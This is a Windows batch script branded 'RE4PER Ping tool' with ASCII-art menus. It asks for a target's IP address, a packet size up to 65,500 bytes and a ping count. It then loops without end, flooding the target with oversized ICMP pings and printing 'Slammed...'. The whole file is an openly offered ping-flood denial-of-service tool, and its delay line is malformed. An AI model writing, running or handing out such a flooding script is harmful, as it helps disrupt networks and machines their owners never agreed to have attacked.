@echo off
chcp 65001
color 0a
title RE4PER Ping tool Made by Kagaku
mode 150
color 0a
goto targetpage
:targetpage
cls
echo.
echo --[[ ████████╗ █████╗ ██████╗  ██████╗ ███████╗████████╗ ]]--
echo --[[ ╚══██╔══╝██╔══██╗██╔══██╗██╔════╝ ██╔════╝╚══██╔══╝ ]]--
echo --[[    ██║   ███████║██████╔╝██║  ███╗█████╗     ██║    ]]--
echo --[[    ██║   ██╔══██║██╔══██╗██║   ██║██╔══╝     ██║    ]]--
echo --[[    ██║   ██║  ██║██║  ██║╚██████╔╝███████╗   ██║    ]]--
echo --[[    ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝    ]]--
echo.
set /p IPT=Enter Target's IP: 
set IPData=%IPT%
goto bytepage
:bytepage
cls
echo.
echo --[[ ███████╗██╗███████╗███████╗ ]]--
echo --[[ ██╔════╝██║╚══███╔╝██╔════╝ ]]--
echo --[[ ███████╗██║  ███╔╝ █████╗   ]]--
echo --[[ ╚════██║██║ ███╔╝  ██╔══╝   ]]--
echo --[[ ███████║██║███████╗███████╗ ]]--
echo --[[ ╚══════╝╚═╝╚══════╝╚══════╝ ]]--
echo.
set /p Bytesize=Enter How big your packets will be [Max is 65,500]:
set ByteData=%Bytesize%
goto speedpage
:speedpage
cls
echo.
echo --[[ ███████╗██████╗ ███████╗███████╗██████╗  ]]--
echo --[[ ██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗ ]]--
echo --[[ ███████╗██████╔╝█████╗  █████╗  ██║  ██║ ]]--
echo --[[ ╚════██║██╔═══╝ ██╔══╝  ██╔══╝  ██║  ██║ ]]--
echo --[[ ███████║██║     ███████╗███████╗██████╔╝ ]]--
echo --[[ ╚══════╝╚═╝     ╚══════╝╚══════╝╚═════╝  ]]--
echo.
set /p Speed=Enter how fast you want it [Number of Pings]:
set SpeedData=%Speed%
goto confirmation
:confirmation
cls
echo {
echo   Target's IP = %IPData%
echo   Size = %ByteData%
echo   Speed = %SpeedData%
echo   CTRL+C TO STOP PINGING 
echo }
set /p Confirm=Is this correct? [Y/N]
if %Confirm%==Y goto pinger 
cls
if %Confirm%==N goto targetpage
:pinger
:rainbow
PING -n %SpeedData% -l %ByteData% %IPData% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo Slammed... )
ping -t 2 0 10 127.0.0.1 >nul
color 0a

PING -n %SpeedData% -l %ByteData% %IPData% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo Slammed... )
ping -t 2 0 10 127.0.0.1 >nul
color 0b

PING -n %SpeedData% -l %ByteData% %IPData% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo Slammed... )
ping -t 2 0 10 127.0.0.1 >nul
color 0c

PING -n %SpeedData% -l %ByteData% %IPData% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo Slammed... )
ping -t 2 0 10 127.0.0.1 >nul
color 0d

PING -n %SpeedData% -l %ByteData% %IPData% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo Slammed... )
ping -t 2 0 10 127.0.0.1 >nul
color 0e

PING -n %SpeedData% -l %ByteData% %IPData% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo Slammed... )
ping -t 2 0 10 127.0.0.1 >nul
color 0f
goto rainbow
